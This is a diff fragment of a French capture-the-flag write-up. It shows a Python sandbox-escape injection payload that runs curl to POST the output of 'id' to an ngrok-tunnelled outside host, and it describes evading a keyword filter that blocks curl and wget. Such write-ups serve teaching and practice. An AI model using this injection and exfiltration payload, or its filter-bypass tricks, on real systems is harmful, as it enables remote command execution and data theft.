@@ -39,7 +39,7 @@ echo file_get_contents("data.txt");
 ?>
 ```
 
-- J'héberge le fichier ``PHP`` dans le dossier ``tmp``. Comme tunnel j'utilise ``ngrok``: ``ngrok http 80``.
+- J'héberge le fichier ``PHP`` dans le dossier ``/tmp``. Comme tunnel j'utilise ``ngrok``: ``ngrok http 80``.
 - J'ai maintenant mon lien, que je peux exploiter pour recept les données.
 - Je reviens à la base, mais cette fois-ci en utilisant ``curl`` pour renvoyer une requête ``POST``: ``);geattr(__builtins__,'__imp''ort__')('o''s').popen('curl\x20-X\x20POST\x20-d\x20\x22data=$(id)\x22\x20https://rand.ngrok.io/tmp')#``.
 - J'obtiens ``Blocked``, le filtre a donc trigger une partie de la commande. Ayant la flemme de chercher une alternative (``wget triggered``). Je teste plusieurs techniques de bypass: ``'CURL'.lower()`` => ``Blocked``. Puis une ne méthode de chiffrement pour déchiffrer dynamiquement et exécuter ``curl``.
